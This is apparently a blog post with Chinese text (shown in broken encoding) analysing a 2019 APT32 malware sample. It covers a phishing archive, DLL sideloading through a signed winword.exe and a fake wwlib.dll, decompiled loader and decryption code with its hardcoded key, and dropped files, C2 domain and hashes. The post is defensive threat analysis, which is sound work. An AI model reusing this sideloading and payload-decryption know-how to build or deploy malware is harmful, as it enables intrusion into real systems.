---
layout:     post
title:   APT32-æµ·è²èŠ±-20190504
subtitle:   APT
date:       2019-05-04
author:     DC
header-img: img/post-bg-universe.jpg
catalog: true
tags:
    - APT
---


# APT32-æµ·è²èŠ±-20190504

è·Ÿè¿›[é›¶æ€è½¯æ£€å‡ºï¼Œæˆ‘å›½é­åˆ°â€œæµ·è²èŠ±â€æ–°æ‰‹æ³•æ”»å‡»](https://www.freebuf.com/articles/network/201836.html)äº‹ä»¶ã€‚

è·Ÿè¿›æ ·æœ¬åšåˆ†æåŠå½“æ¬¡äº‹ä»¶ttpsçŸ©é˜µæå–ï¼ˆåæ§½ä¸‹é›¶æ£€å‡ºè¿™ä¸ªå™±å¤´ï¼‰



##### TTPSçŸ©é˜µ

#### æˆ˜ç•¥æˆ˜æœ¯ç‰¹å¾

|          |                                                              |
| -------- | ------------------------------------------------------------ |
| èƒŒæ™¯     | è¶Šå—èƒŒæ™¯                                                     |
| ç›®æ ‡ç¾¤ä½“ | ï¼ˆæ­¤æ¬¡æœªæ ‡æ˜æ”»å‡»å¯¹è±¡ã€‚æ¥æºç–‘ä¸ºhuntingå‡ºæ ·æœ¬ã€ä»¥å¾€ç›®æ ‡ä¸º**ä¸­å›½èƒ½æºç›¸å…³è¡Œä¸šã€æµ·äº‹æœºæ„ã€æµ·åŸŸå»ºè®¾éƒ¨é—¨ã€ç§‘ç ”é™¢æ‰€å’Œèˆªè¿ä¼ä¸šç­‰è¿›è¡Œç½‘ç»œæ”»å‡»**ã€‚**å…¨çƒçš„æ”¿åºœã€å†›äº‹æœºæ„å’Œå¤§å‹ä¼ä¸šï¼Œä»¥åŠæœ¬å›½çš„åª’ä½“ã€äººæƒå’Œå…¬æ°‘ç¤¾ä¼šç­‰ç›¸å…³çš„ç»„ç»‡å’Œ ä¸ªäºº**ï¼‰ |
| æŠ•é€’æ–¹å¼ | é‚®ä»¶æŠ•é€’ï¼ˆå‹ç¼©åŒ…åç§°ä¸º2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨ï¼Œï¼‰         |
| æ”»å‡»å…¥å£ | ä¼ªè£…æ–‡ä»¶                                                     |
| é‡Šæ”¾æµç¨‹ | Camouflage_file->Droopper->Droopper->Malware                 |



#### åŸºç¡€è®¾æ–½ç‰¹å¾

| C2åŠèµ„æºä¸‹å‘              |                                                 |
| ------------------------- | ----------------------------------------------- |
| åŸŸå                      | officewps.net                                   |
| URL                       | https://officewps.net/ultra.jpg                 |
| URLå‚æ•°                   |                                                 |
| **æ ·æœ¬ä¸­æºå¸¦çš„ä¿¡æ¯**      |                                                 |
| ***MD5***                 | **ceaa5817a65e914aa178b28f12359a46**            |
| ç­¾åè¯ä¹¦ç”Ÿæˆæ—¶é—´          | 07:43 PM 04/04/2006                             |
| PDB/è°ƒè¯•è·¯å¾„&æºç è·¯å¾„     | t:\word\x86\ship\0\winword.pdb                  |
| è¯±æƒ‘æ–‡æ¡£å†…å®¹/æ ¼å¼         | 2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨/exe                  |
| æ–‡æ¡£æ‹¥æœ‰è€…/æœ€åä¸€ä¸ªä¿®æ”¹è€… | Microsoft Corporation/Microsoft Corporation     |
| ***MD5***                 | **05e513c612b0384804db9bda5277087c**            |
| ç­¾åè¯ä¹¦ç”Ÿæˆæ—¶é—´          |                                                 |
| PDB/è°ƒè¯•è·¯å¾„&æºç è·¯å¾„     |                                                 |
| è¯±æƒ‘æ–‡æ¡£å†…å®¹/æ ¼å¼         | /dll                                            |
| æ–‡æ¡£æ‹¥æœ‰è€…/æœ€åä¸€ä¸ªä¿®æ”¹è€… |                                                 |
| ***MD5***                 | **a16702ed1812ddc42153ef070f3dfdd6**            |
| ç­¾åè¯ä¹¦ç”Ÿæˆæ—¶é—´          | 12:00 AM 01/06/2016                             |
| PDB/è°ƒè¯•è·¯å¾„&æºç è·¯å¾„     | e:\se9\src\out\Release\initialexe\360se.exe.pdb |
| è¯±æƒ‘æ–‡æ¡£å†…å®¹/æ ¼å¼         | /exe                                            |
| æ–‡æ¡£æ‹¥æœ‰è€…/æœ€åä¸€ä¸ªä¿®æ”¹è€… | 360.cn/360.cn                                   |
| ***MD5***                 | **3b132e407474bc1c830d5a173428a6e1**            |
| ç­¾åè¯ä¹¦ç”Ÿæˆæ—¶é—´          |                                                 |
| PDB/è°ƒè¯•è·¯å¾„&æºç è·¯å¾„     |                                                 |
| è¯±æƒ‘æ–‡æ¡£å†…å®¹/æ ¼å¼         | /exe                                            |
| æ–‡æ¡£æ‹¥æœ‰è€…/æœ€åä¸€ä¸ªä¿®æ”¹è€… |                                                 |
| ***MD5***                 | **802cb895c1f0085611c74edf2b177df6**            |



#### æŠ€æœ¯ç‰¹å¾çŸ©é˜µ

| åŠ è§£å¯†         |                                              |
| -------------- | -------------------------------------------- |
| ä½ç½®           | å†…å­˜ï¼ˆé¡»æ ‡æ˜å®é™…åç§»ï¼Œæœ¬æ¬¡åŠ¨æ€è·å–01E9EC6Cï¼‰ |
| åŠ å¯†æ–¹å¼       | hash(cryptAPI)                               |
| åŠ å¯†ç§˜é’¥       | CH!n@Num83r1f0RSur3n0J0ke!                   |
| é‡Šæ”¾æ–‡ä»¶       | 360se.exeã€chrome_elf.dll                    |
| **æ”»å‡»æŠ€æœ¯**   |                                              |
| ä½¿ç”¨å·¥å…·       | Cobalt Strike                                |
| è¿è¡Œç¯å¢ƒæ£€æµ‹   |                                              |
| æŒä¹…æ€§éƒ¨ç½²     |                                              |
| æ¼æ´åˆ©ç”¨       |                                              |
| **C2æŠ€æœ¯ç‰¹å¾** |                                              |
| C2æ‰€åœ¨åŒºåŸŸ     | æ³°å›½                                         |
| C2è·å–æ–¹å¼     | æœ¬åœ°è§£å¯†                                     |
| C2é€šä¿¡æ–¹å¼     | DNS                                          |
| C2æŒ‡ä»¤ç‰¹ç‚¹     | æ•°å­—æŒ‡ä»¤                                     |
| **å¯¹æŠ—æŠ€æœ¯**   |                                              |
| åæ€è½¯         |                                              |
| åè™šæ‹Ÿæœº       |                                              |
| è¡Œä¸ºéšè—       |                                              |



##### çŒœæµ‹é‡‡ç”¨é‚®ä»¶å‘é€è¡Œä¸ºè¿›è¡Œè¾¹ç•Œçªç ´ï¼š

æœªæœ‰é‚®ä»¶å†…å®¹



##### é‡‡ç”¨ä¼ªè£…æ–‡ä»¶ä½œä¸ºæ”»å‡»å…¥å£

é™„ä»¶ä¸ºrarå‹ç¼©åŒ…

> åŸºç¡€ä¿¡æ¯ï¼š
>
> MD5
>
> ae3c759c49745190e6c9c48c34be2da9
>
> SHA-1
>
> c3add850b950fa539efd5bb0e17a36c315192a92
>
> File Type
>
> RAR
>
> Magic
>
> RAR archive data, v0, flags: Archive volume, Commented, Solid, Authenticated,
>
> SSDeep
>
> 12288:aIkj9L5pSDycJu0ZCvgsJH/mftU+bGPDyBVZxP5nS05TBkRB0gDWwsQ5+4:/kjxTyycJfCvggHe2lCVtBQGusGD
>
> TRiD
>
> RAR compressed archive (v5.0) (61.5%) RAR compressed archive (gen) (38.4%)
>
> File Size
>
> 682.28 KB



è§£å‹å‡ºåŒçº§ç›®å½•ä¸‹ä¸¤ä¸ªæ–‡ä»¶

> MD5ï¼š
>
> ceaa5817a65e914aa178b28f12359a46 
>
> 05e513c612b0384804db9bda5277087c

æ–‡ä»¶åˆ†æï¼š

**ä¼ªè£…æ–‡æ¡£çš„winwordç»„ä»¶**

| SHA-256   | 6c959cfb001fbb900958441dfd8b262fb33e052342948bab338775d3e83ef7f7 |
| --------- | ------------------------------------------------------------ |
| MD5       | ceaa5817a65e914aa178b28f12359a46                             |
| File name | 2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨.EXE                               |
| File size | 339.29 KB                                                    |
| File Type | Win32 EXE                                                    |

è¯¥æ–‡ä»¶ä¸ºwindow office  2007 ç»„ä»¶ windword.exe   è¯¥ç»„ä»¶ä¸»è¦åŠŸèƒ½ä¸ºå¯åŠ¨ office word æ•´ä½“ç¨‹åºã€‚è¯ä¹¦ä¸º2006-2007çš„è¿‡æœŸå¾®è½¯è¯ä¹¦ã€‚æ–‡ç« æ‰€è¯´çš„é›¶æ£€å‡ºæŒ‡çš„æ˜¯å¯¹è¿™ä¸ªwindows  offce ç»„ä»¶æœªæˆåŠŸæ£€å‡ºã€‚



åœ¨winword.exe ä¸­,æ”»å‡»è€…é€šè¿‡åˆ†æäº†è§£  sub_30001573 å¯¹wwlib.dll çš„åŠ è½½è¿‡ç¨‹ï¼Œè°ƒç”¨dll FMainã€wdCommandDispatchã€wdGetApplicationObjectå‡½æ•°å è¿›è¡Œåç»­ç¨‹åºå¯åŠ¨è¿‡ç¨‹è¿›è¡ŒåŠ«æŒæ”»å‡»

```c
signed int __stdcall sub_30001573(int a1, int a2, int a3, int a4)
{
  HMODULE v4; // edi@1
  FARPROC v5; // ebx@2
  FARPROC v6; // eax@2
  signed int result; // eax@5

  v4 = LoadLibraryW(L"wwlib.dll");  // é€šè¿‡loadlibraryï¼Œåœ¨dll çš„åŠ è½½è¿‡ç¨‹ä¸­è¿›è¡Œäº†æ¶æ„è°ƒç”¨
  if ( v4 || (v4 = (HMODULE)sub_30001968(L"{0638C49D-BB8B-4CD1-B191-051E8F325736}")) != 0 )
  {
    v5 = GetProcAddress(v4, "FMain");
    dword_30003010 = (int)GetProcAddress(v4, "wdCommandDispatch");
    v6 = GetProcAddress(v4, "wdGetApplicationObject");
    dword_3000300C = (int)v6;
    if ( v5 && dword_30003010 && v6 )
    {
      ((void (__stdcall *)(int, int, int, int))v5)(a1, a2, a3, a4);
      FreeLibrary(v4);
      result = 0;
    }
    else
    {
      result = 1;
    }
  }
  else
  {
    GetLastError();
    result = 1;
  }
  return result;
}
```

æ”»å‡»æ‰‹æ³•ä¸Šé€šè¿‡åˆ©ç”¨è¯¥ç»„ä»¶å¯¹wwlib.dllçš„è°ƒç”¨ï¼Œå°†wwlib.dllåŒåæ–‡ä»¶ä»¥éšè—å±æ€§è®¾ç½®åœ¨åŒç›®å½•ä¸‹ï¼Œä»è€Œåœ¨è°ƒç”¨æ—¶ä¼˜å…ˆè°ƒç”¨åŒçº§ç›®å½•åº“æ–‡ä»¶è¿›è¡Œdllæ›¿æ¢è¾¾åˆ°dllåŠ«æŒæ”»å‡»çš„ç›®çš„ã€‚æ”»å‡»è€…ä½¿ç”¨è¯¥ç³»ç»Ÿç»„ä»¶ä¼ªè£…ä¸ºxlsè¡¨æ ¼æ–‡æ¡£è¾¾åˆ°ç»•è¿‡æ£€æµ‹ç›®çš„æ¥è¿›è¡Œæ¬ºéª—ä½œä¸ºæ”»å‡»å…¥å£è°ƒç”¨åç»­ä¼ªé€ wwlib.dllã€‚

åœ¨è¿™é‡Œé‡‡ç”¨äº†**wordç»„ä»¶ç™½åˆ©ç”¨**çš„æ”»å‡»æ–¹å¼ã€‚

**ä¼ªé€ wwlib.dll æ–‡ä»¶**

| SHA-256   | 236623cd3be93a832ae86bb7bfbf66e6d5e00abbc6ebc6555c09988412448391 |
| --------- | ------------------------------------------------------------ |
| MD5       | 05e513c612b0384804db9bda5277087c                             |
| File name | wwlib.dll                                                    |
| File size | 1.37 MB                                                      |
| File Type | Win32 DLL                                                    |



åœ¨wordç»„ä»¶åŠ è½½æ¶æ„wwlib.dll,åœ¨ dll åˆå§‹åŒ–æ—¶ï¼Œè°ƒç”¨æ¶æ„åˆ©ç”¨æ¨¡å—ï¼š

1. è°ƒç”¨cryptAPI  è§£å¯†ç§˜é’¥è¿›è¡Œ æ–‡ä»¶åè§£å¯†
2. é‡Šæ”¾chrome_elf.dllã€360se.exeæ–‡ä»¶åˆ° C:\ProgramData\360seMaintenanceï¼›é‡Šæ”¾ 2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨.docx  åˆ°æœ¬åœ°ç›®å½•ä¸‹
3. æ ¹æ®æ³¨å†Œè¡¨æ˜¯å¦å­˜åœ¨ Software\\Classes\\   â€åˆ›å»ºâ€œ.docâ€å’Œâ€œ.docx  .pdfé¡¹ï¼Œå­˜åœ¨docé¡¹ 
4. é€šè¿‡ createporcessW å¯åŠ¨ 360se.exe  åŠåŒæ ·çš„å‘½ä»¤è¡Œä¼ å‚ æ‰“å¼€ â€œ2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨.docxâ€  
5. é€šè¿‡360se.exeï¼ˆ360æµè§ˆå™¨ç»„ä»¶ï¼‰ è°ƒç”¨  chrome_elf.dll æ¶æ„payload åˆ©ç”¨ã€‚



```c
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  void *v3; // ecx@2
  char v5; // [sp-30h] [bp-54h]@6
  int v6; // [sp-2Ch] [bp-50h]@6
  int v7; // [sp-28h] [bp-4Ch]@6
  int v8; // [sp-24h] [bp-48h]@6
  int v9; // [sp-20h] [bp-44h]@6
  int v10; // [sp-1Ch] [bp-40h]@6
  const void *v11; // [sp-18h] [bp-3Ch]@6
  int v12; // [sp-14h] [bp-38h]@6
  int v13; // [sp-10h] [bp-34h]@6
  int v14; // [sp-Ch] [bp-30h]@6
  DWORD v15; // [sp-8h] [bp-2Ch]@6
  int v16; // [sp-4h] [bp-28h]@6
  HKEY phkResult; // [sp+8h] [bp-1Ch]@3
  const void **v18; // [sp+Ch] [bp-18h]@6
  int v19; // [sp+20h] [bp-4h]@6

  if ( fdwReason == 1 && sub_10009170() )  //sub_10009170 é€šè¿‡cryptAPIè§£å¯†ï¼Œé‡Šæ”¾chrome_elf.dllã€360se.exeæ–‡ä»¶åˆ° C:\ProgramData\360seMaintenanceï¼›é‡Šæ”¾ 2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨.docx  åˆ°æœ¬åœ°ç›®å½•ä¸‹
  {
    sub_100092A0(v3); //è¿›è¡Œ doc çš„æ³¨å†Œè¡¨é¡¹åˆ¤æ–­ è°ƒç”¨ 360se.exe
    if ( !RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\WORD.19", 0, 0x20019u, &phkResult) )
    {
      RegCloseKey(phkResult);
      ExitProcess(1u);
    }
    sub_100072F0(); //.doc åˆ¤æ–­SOFTWARE\\Classes\\ 
    sub_10003F00(); //.docx åˆ¤æ–­SOFTWARE\\Classes\\ 
    sub_10005D90(); //.pdf åˆ¤æ–­SOFTWARE\\Classes\\ 
    v18 = &v11;
    v16 = 15;
    v15 = 0;
    LOBYTE(v11) = 0;
    sub_1000A400(&v11, (int)&dword_10022100, 0, 0xFFFFFFFF);
    v19 = 0;
    v10 = 15;
    v9 = 0;
    v5 = 0;
    sub_1000A400(&v5, (int)&dword_100220A0, 0, 0xFFFFFFFF);
    v19 = -1;
    if ( !sub_100037C0(*(LPCSTR *)&v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16) )
    {
      sub_10008EA0();
      sub_10005AB0();
      sub_10007020();
    }
    ExitProcess(1u);
  }
  return 1;
}
```



##### åŠ è§£å¯†

æ ·æœ¬é‡‡ç”¨çš„åŠ è§£å¯†æ–¹æ³•ä¸º é€šè¿‡ cryptAPI  è¿›è¡Œ  hash åŠ è§£å¯†

ç§˜é’¥å­˜å‚¨åœ¨å†…å­˜ä¸­

```
.rdata:1001E478 qword_1001E478  dq 6D754E406E214843h    ; DATA XREF: sub_10001AA0+40r
.rdata:1001E478                                         ; cryname+40r
.rdata:1001E480 qword_1001E480  dq 5352306631723338h    ; DATA XREF: sub_10001AA0+56r
.rdata:1001E480                                         ; cryname+56r
.rdata:1001E488 qword_1001E488  dq 6B304A306E337275h    ; DATA XREF: sub_10001AA0+67r
.rdata:1001E488                                         ; cryname+67r

ç§˜é’¥ï¼š
6D754E406E214843h
5352306631723338h
6B304A306E337275h

003DE88C   003DE8C8  ASCII "CH!n@Num83r1f0RSur3n0J0ke!"


è§£å¯†æ•°æ®ï¼š
é€šè¿‡å¯¹æ•°æ®
01E9EC6C  6D 42 74 4A 62 52 36 6D  mBtJbR6m
01E9EC74  48 36 35 72 55 65 46 6E  H65rUeFn
01E9EC7C  6B 79 34 4A 20 79 45 55  ky4J yEU
01E9EC84  4C 63 52 62 74 4A 62 4E  LcRbtJbN
01E9EC8C  69 4E 77 3D 3D 20 6B 77  iNw== kw
01E9EC94  64 50 63 67 44 35 62 2B  dPcgD5b+
01E9EC9C  52 6F 55 61 6C 71 6E 43  RoUalqnC
01E9ECA4  64 2B 78 4A 50 2F 4F 46  d+xJP/OF
01E9ECAC  34 64 59 42 65 62 4C 36  4dYBebL6
01E9ECB4  7A 6E 44 43 50 74 62 44  znDCPtbD
01E9ECBC  34 3D 20 76 78 78 59 65  4= vxxYe
01E9ECC4  6C 32 6E 4C 36 68 2F 4E  l2nL6h/N
01E9ECCC  77 3D 3D 00 00 00 00 00  w==.....

ä¸­çš„æ•°æ®æå–ä»¥ 0x20 ä¸ºä¸­æ­¢çš„æ•°æ®æ®µ è½¬åŒ–ä¸ºbinarybyteæ ¼å¼å è¿›è¡Œè§£å¯† 

1.æ–‡ä»¶åè§£å¯†

   yEULcRbtJbNiNw==   è§£å¯†å‡º   360se.exe

0040EDC0   00486DC8  ASCII "yEULcRbtJbNiNw=="

0040EDC4   0040EDAC  ASCII "xzH"

0040EDB8   73BA20E8  ASCII A0,"mH"

0040EDAC   00487A78  ASCII "360se.exe"


   mBtJbR6mH65rUeFnky4J  =ã€‹ ?Im??kQé†™?..  =ã€‹  chrome_elf.dll

003DE8FC   00866DC8  ASCII "mBtJbR6mH65rUeFnky4J"
003DE900   0015ECCF
003DE904   0015EC7F
003DE908   003DF2D4
003DE90C   00000014
003DE910   0000001F

00867A78  98 1B 49 6D 1E A6 1F AE  ?Im??
00867A80  6B 51 E1 67 93 2E 09 00  kQé†™?..

$-4      > 00537A90  ASCII "chrome_elf.dll"



    vxxYel2nL6h/Nw==    è§£å¯†ä¸º   Docx.docx

ecx=00536DA0, (ASCII "vxxYel2nL6h/Nw==")

00536DA0  76 78 78 59 65 6C 32 6E  vxxYel2n
00536DA8  4C 36 68 2F 4E 77 3D 3D  L6h/Nw==

$-B0     > 00537A90  ASCII "Docx.docx"



å…¶ä»–å­—æ®µï¼š
$-38     > 005361F0  ASCII "kwdPcgD5b+RoUalqnCd+xJP/OF4dYBebL6znDCPtbD4="

005361F0  6B 77 64 50 63 67 44 35  kwdPcgD5
005361F8  62 2B 52 6F 55 61 6C 71  b+RoUalq
00536200  6E 43 64 2B 78 4A 50 2F  nCd+xJP/
00536208  4F 46 34 64 59 42 65 62  OF4dYBeb
00536210  4C 36 7A 6E 44 43 50 74  L6znDCPt
00536218  62 44 34 3D 00 00 00 00  bD4=....

è¿½åŠ åé¢åšurlè§£å¯†


```

è§£å¯†å‡½æ•°

```c
int __usercall cryname@<eax>(void *a1@<ecx>, void *a2, int a3, int a4, int a5, int a6, int a7)
{
  int v7; // esi@1
  unsigned int v8; // edi@2
  char v9; // al@3
  unsigned int v10; // eax@6
  void *v11; // eax@9
  bool v12; // cf@17
  void *v13; // eax@20
  unsigned int v14; // edi@25
  char v15; // al@26
  void *v16; // eax@32
  void *v17; // edi@41
  size_t v18; // ecx@42
  void *v20; // [sp+10h] [bp-50h]@1
  HCRYPTPROV hProv; // [sp+14h] [bp-4Ch]@1
  HCRYPTKEY hKey; // [sp+18h] [bp-48h]@1
  void *v23; // [sp+1Ch] [bp-44h]@41
  int v24; // [sp+2Ch] [bp-34h]@41
  unsigned int v25; // [sp+30h] [bp-30h]@41
  __int64 v26; // [sp+34h] [bp-2Ch]@1
  __int64 v27; // [sp+3Ch] [bp-24h]@1
  __int64 v28; // [sp+44h] [bp-1Ch]@1
  __int16 v29; // [sp+4Ch] [bp-14h]@1
  char v30; // [sp+4Eh] [bp-12h]@1
  int v31; // [sp+5Ch] [bp-4h]@1

  v7 = (int)a1;
  v31 = 0;
  v29 = 8549;
    
  //é‡‡ç”¨hashåŠ å¯†  æå–è§£å¯†æ‰€ç”¨ç§˜é’¥
  //qword_1001E478ã€qword_1001E480ã€qword_1001E488
  _mm_storel_epi64((__m128i *)&v26, _mm_loadl_epi64((const __m128i *)&qword_1001E478));
  v30 = 0;
  _mm_storel_epi64((__m128i *)&v27, _mm_loadl_epi64((const __m128i *)&qword_1001E480));
  hProv = 0;
  hKey = 0;
  _mm_storel_epi64((__m128i *)&v28, _mm_loadl_epi64((const __m128i *)&qword_1001E488));
  
    
   v20 = 0;
  if ( !sub_1000C430(&hProv, &hKey, (BYTE *)&v26) )  // è·å–è§£å¯†API  å¥æŸ„
  {
    *(_DWORD *)(v7 + 20) = 15;
    *(_DWORD *)(v7 + 16) = 0;
    *(_BYTE *)v7 = 0;
    v8 = 0;
    if ( v0 )
    {
      do
        v9 = *(_BYTE *)v8++;
      while ( v9 );
      --v8;
      if ( v8 > 0xFFFFFFFE )
        sub_10016104("string too long");
    }
    v10 = *(_DWORD *)(v7 + 20);
    if ( v10 < v8 )
    {
      sub_1000B5E0(v7, v8, *(_DWORD *)(v7 + 16));
      if ( !v8 )
        goto LABEL_47;
      goto LABEL_8;
    }
    if ( v8 )
    {
LABEL_8:
      if ( *(_DWORD *)(v7 + 20) < 0x10u )
        v11 = (void *)v7;
      else
        v11 = *(void **)v7;
      if ( v8 )
        memmove_0(v11, 0, v8);
      v12 = *(_DWORD *)(v7 + 20) < 0x10u;
      *(_DWORD *)(v7 + 16) = v8;
      if ( v12 )
        *(_BYTE *)(v7 + v8) = 0;
      else
        *(_BYTE *)(*(_DWORD *)v7 + v8) = 0;
      goto LABEL_47;
    }
LABEL_11:
    *(_DWORD *)(v7 + 16) = 0;
    if ( v10 < 0x10 )
      *(_BYTE *)v7 = 0;
    else
      **(_BYTE **)v7 = 0;
    goto LABEL_47;
  }
  v13 = &a2;
  if ( (unsigned int)a7 >= 0x10 )
    v13 = a2;
  if ( crydata(hKey, &v20, (int)v13) )    //è§£å¯†æ•°æ®
  {
    v17 = v20;
    v25 = 15;
    v24 = 0;
    LOBYTE(v23) = 0;
    if ( *(_BYTE *)v20 )
      v18 = strlen((const char *)v20);
    else
      v18 = 0;
    sub_1000AD50((int)&v23, v20, v18);
    free(v17);
    sub_1000C690(hKey, hProv);           //é”€æ¯æ•°æ®å’Œå¥æŸ„
    sub_10009D20((void *)v7, &v23);
    if ( v25 >= 0x10 )
      j__free(v23);
    v25 = 15;
    v24 = 0;
    LOBYTE(v23) = 0;
  }
  else
  {
    if ( hProv )
      CryptReleaseContext(hProv, 0);
    *(_DWORD *)(v7 + 20) = 15;
    *(_DWORD *)(v7 + 16) = 0;
    *(_BYTE *)v7 = 0;
    v14 = 0;
    if ( v0 )
    {
      do
        v15 = *(_BYTE *)v14++;
      while ( v15 );
      --v14;
      if ( v14 > 0xFFFFFFFE )
        sub_10016104("string too long");
    }
    v10 = *(_DWORD *)(v7 + 20);
    if ( v10 >= v14 )
    {
      if ( !v14 )
        goto LABEL_11;
    }
    else
    {
      sub_1000B5E0(v7, v14, *(_DWORD *)(v7 + 16));
      if ( !v14 )
        goto LABEL_47;
    }
    if ( *(_DWORD *)(v7 + 20) < 0x10u )
      v16 = (void *)v7;
    else
      v16 = *(void **)v7;
    if ( v14 )
      memmove_0(v16, 0, v14);
    v12 = *(_DWORD *)(v7 + 20) < 0x10u;
    *(_DWORD *)(v7 + 16) = v14;
    if ( v12 )
      *(_BYTE *)(v14 + v7) = 0;
    else
      *(_BYTE *)(v14 + *(_DWORD *)v7) = 0;
  }
LABEL_47:
  if ( (unsigned int)a7 >= 0x10 )
    j__free(a2);
  return v7;
}
```

åç»­è¿›è¡Œäº†ï¼š

1. æ–‡ä»¶é‡Šæ”¾æ“ä½œ
2. æ³¨å†Œè¡¨æ“ä½œ
3. è°ƒç”¨ word å’Œ 360se.exeè¿›è¡Œä¸‹ä¸€é˜¶æ®µæ¶æ„è°ƒç”¨

**æ–‡ä»¶é‡Šæ”¾æ“ä½œï¼š**

```c

é‡Šæ”¾ï¼šC:\ProgramData\360seMaintenance\chrome_elf.dll
æ¡ä»¶ä¸ºçœŸ TRUE
å †æ ˆ ss:[0043ED04]=00536260, (ASCII "C:\ProgramData\360seMaintenance\chrome_elf.dll")
esi=0043ED04

é‡Šæ”¾ï¼šC:\ProgramData\360seMaintenance\360se.exe
$-1C     > 0053F630  |FileName = "C:\ProgramData\360seMaintenance\360se.exe"
$-18     > 00000003  |Access = 3
$-14     > 00000000  |ShareMode = 0
$-10     > 00000000  |pSecurity = NULL
$-C      > 00000004  |Mode = OPEN_ALWAYS
$-8      > 00000080  |Attributes = NORMAL
$-4      > 00000000  \hTemplateFile = NULL

éƒ¨åˆ†æ•°æ®ï¼š
01E85A00  02 FC 00 00 4D 5A 90 00  ?.MZ?
01E85A08  03 00 00 00 04 00 00 00  ......
01E85A10  FF FF 00 00 B8 00 00 00  ï£µï£µ..?..
01E85A18  00 00 00 00 40 00 00 00  ....@...
01E85A20  00 00 00 00 00 00 00 00  ........
01E85A28  00 00 00 00 00 00 00 00  ........
01E85A30  00 00 00 00 00 00 00 00  ........
01E85A38  00 00 00 00 00 00 00 00  ........
01E85A40  00 01 00 00 0E 1F BA 0E  ...?
01E85A48  00 B4 09 CD 21 B8 01 4C  .???L
01E85A50  CD 21 54 68 69 73 20 70  ?This p
01E85A58  72 6F 67 72 61 6D 20 63  rogram c
01E85A60  61 6E 6E 6F 74 20 62 65  annot be
01E85A68  20 72 75 6E 20 69 6E 20   run in
01E85A70  44 4F 53 20 6D 6F 64 65  DOS mode
01E85A78  2E 0D 0D 0A 24 00 00 00  ....$...
01E85A80  00 00 00 00 94 D5 67 2C  ....æ–¦g,
01E85A88  D0 B4 09 7F D0 B4 09 7F  å†™.å†™.
01E85A90  D0 B4 09 7F 2C C3 B7 7F  å†™.,æ¢…

002CF844   0047D148  ASCII "uElnVwCmMrhb0DJfuyd635S+JmcIKlGUbOu/QX2kPArgtXWeY61VuQDJ+Ot6Hv+ay4QQBVCK23aLpnXh/S+SYM4OKZ6IERMdCX43"

002CF81C   00476260  ASCII "C:\ProgramData\360seMaintenance\chrome_elf.dll"

0047D148  75 45 6C 6E 56 77 43 6D 4D 72 68 62 30 44 4A 66  uElnVwCmMrhb0DJf
0047D158  75 79 64 36 33 35 53 2B 4A 6D 63 49 4B 6C 47 55  uyd635S+JmcIKlGU
0047D168  62 4F 75 2F 51 58 32 6B 50 41 72 67 74 58 57 65  bOu/QX2kPArgtXWe
0047D178  59 36 31 56 75 51 44 4A 2B 4F 74 36 48 76 2B 61  Y61VuQDJ+Ot6Hv+a
0047D188  79 34 51 51 42 56 43 4B 32 33 61 4C 70 6E 58 68  y4QQBVCK23aLpnXh
0047D198  2F 53 2B 53 59 4D 34 4F 4B 5A 36 49 45 52 4D 64  /S+SYM4OKZ6IERMd
0047D1A8  43 58 34 33 6E 37 64 30 62 55 49 74 30 31 38 32  CX43n7d0bUIt0182
0047D1B8  58 33 36 50 2F 73 61 32 00 00 00 00 00 00 00 00  X36P/sa2........





é‡Šæ”¾ï¼š 2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨.docx
å †æ ˆåœ°å€=0043EF3C, (UNICODE "C:\Users\ç®\AppData\Local\Temp")
ecx=F0399C68
æ¡ä»¶ä¸ºçœŸ TRUE
ds:[73992088]=00536378, (UNICODE "2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨.docx")
eax=73992088 (wwlib.73992088), ASCII "xcS"
$-1C     > 00536378  |FileName = "2019å¹´ç¬¬ä¸€å­£åº¦å·¥ä½œæ–¹å‘é™„è¡¨.docx"
$-18     > 00000003  |Access = 3
$-14     > 00000000  |ShareMode = 0
$-10     > 00000000  |pSecurity = NULL
$-C      > 00000004  |Mode = OPEN_ALWAYS
$-8      > 00000080  |Attributes = NORMAL
$-4      > 00000000  \hTemplateFile = NULL


éƒ¨åˆ†æ•°æ®ï¼š
01FBA46C  D0 CF 11 E0 A1 B1 1A E1  ì¿ë†¡î„š
01FBA474  00 00 00 00 00 00 00 00  ....
01FBA47C  00 00 00 00 00 00 00 00  ....
01FBA484  3E 00 03 00 FE FF 09 00  >..
01FBA48C  06 00 00 00 00 00 00 00  ...
01FBA494  00 00 00 00 01 00 00 00  ...
01FBA49C  09 00 00 00 00 00 00 00  ....
01FBA4A4  00 10 00 00 0A 00 00 00  á€€...
01FBA4AC  01 00 00 00 FE FF FF FF  ...
01FBA4B4  00 00 00 00 08 00 00 00  ...

    
éƒ¨åˆ†ä»£ç ï¼š

          sub_1000A400(&dword_100220A0, (int)&lpMultiByteStr, 0, 0xFFFFFFFF);
          v52 = &lpMultiByteStr;
          if ( v144 >= 0x10 )
            v52 = (void *)lpMultiByteStr;
          v53 = (WCHAR *)sub_1000D184(0x2000u);
          MultiByteToWideChar(0, 0, (LPCSTR)v52, -1, v53, 4096);
          v54 = CreateFileW(v53, 3u, 0, 0, 4u, 0x80u, 0);
          v55 = &v139;
          if ( v141 >= 0x10 )
            v55 = (void *)v139;
          hFile = v54;
          v56 = (WCHAR *)sub_1000D184(0x2000u);
          MultiByteToWideChar(0, 0, (LPCSTR)v55, -1, v56, 4096);
          v57 = CreateFileW(v56, 3u, 0, 0, 4u, 0x80u, 0);
          v58 = hFile;
          v59 = v57;
          WriteFile(hFile, v98 + 4, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
          v97 = 0;
          v96 = (int)&NumberOfBytesWritten;
          v95 = ::nNumberOfBytesToWrite;
          v60 = &::lpBuffer;

```

